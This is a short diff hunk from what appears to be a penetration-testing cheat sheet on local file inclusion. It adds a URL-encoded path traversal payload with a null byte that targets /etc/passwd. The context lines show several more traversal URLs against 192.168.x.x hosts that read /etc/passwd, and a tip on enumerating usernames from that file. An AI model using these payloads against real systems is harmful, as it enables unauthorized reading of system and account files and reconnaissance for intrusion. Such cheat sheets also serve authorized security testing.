@@ -671,6 +671,8 @@ replace language by page,system,file,input,etc
 
 TO ENUMERATE USERNAMES (..search for /home/xxx :/usr/bin   where xxx is username in passwd file) 
 
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00
+
 http://192.168.x.x/index.php?system=../../../../../../etc/passwd%00jpg
 http://192.168.x.x/index.php?system=../../../../../../etc/passwd
 http://192.168.x.x/connect.php?file=../../../../../../etc/passwd
